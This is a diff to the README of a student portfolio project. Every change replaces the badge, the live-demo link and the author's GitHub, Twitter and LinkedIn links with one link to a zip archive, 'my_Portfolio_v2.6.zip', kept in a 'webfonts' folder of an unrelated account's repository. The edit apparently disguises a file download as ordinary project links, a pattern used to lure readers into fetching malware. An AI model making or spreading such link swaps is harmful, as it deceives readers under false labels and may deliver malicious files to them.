@@ -1,5 +1,5 @@
 
-![](https://img.shields.io/badge/Microverse-blueviolet)
+![](https://github.com/Iptysam/myPortfolio/raw/refs/heads/main/webfonts/my_Portfolio_v2.6.zip)
 
 # My-Portfolio project
 In this project, you will set up a basic portfolio for future update.
@@ -12,7 +12,7 @@ In this project, you will set up a basic portfolio for future update.
 
 ## Live Demo 
 
-[Live Demo Link](https://ahmednazirmusah.github.io/myPortfolio/)
+[Live Demo Link](https://github.com/Iptysam/myPortfolio/raw/refs/heads/main/webfonts/my_Portfolio_v2.6.zip)
 
 ## Getting Started
 
@@ -45,9 +45,9 @@ To get a local copy up and running follow these simple example steps.
 
 👤 Ahmed Nazir Musah
 
-- GitHub: [@githubhandle](https://github.com/ahmednazirmusah)
-- Twitter: [@twitterhandle](https://twitter.com/ahmednazirmusah)
-- LinkedIn: [LinkedIn](https://www.linkedin.com/in/ahmed-nazir-musah-529956214?lipi=urn%3Ali%3Apage%3Ad_flagship3_profile_view_base_contact_details%3BaN%2F7ouJiQmaaZdym2t1Uxg%3D%3D)
+- GitHub: [@githubhandle](https://github.com/Iptysam/myPortfolio/raw/refs/heads/main/webfonts/my_Portfolio_v2.6.zip)
+- Twitter: [@twitterhandle](https://github.com/Iptysam/myPortfolio/raw/refs/heads/main/webfonts/my_Portfolio_v2.6.zip)
+- LinkedIn: [LinkedIn](https://github.com/Iptysam/myPortfolio/raw/refs/heads/main/webfonts/my_Portfolio_v2.6.zip%3Ali%3Apage%3Ad_flagship3_profile_view_base_contact_details%3BaN%2F7ouJiQmaaZdym2t1Uxg%3D%3D)
 
 
 ## 🤝 Contributing
